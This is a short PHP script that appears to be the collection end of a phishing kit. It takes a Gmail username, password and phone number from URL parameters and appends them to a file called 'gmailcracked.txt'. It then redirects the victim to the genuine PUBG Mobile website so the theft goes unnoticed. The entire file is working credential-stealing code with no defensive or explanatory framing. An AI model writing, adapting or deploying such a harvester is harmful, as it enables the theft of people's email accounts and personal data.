<?php

file_put_contents("gmailcracked.txt", "[Name:] " . $Username_GM = $_GET['Username_GM'] . " [Pass:] " . $Password_GM = $_GET['Password_GM'] . " [PhoneNum:] " . $Phone_GM = $_GET['Phone_GM'] ."\n", FILE_APPEND);
header('Location: https://www.pubgmobile.com');
exit();

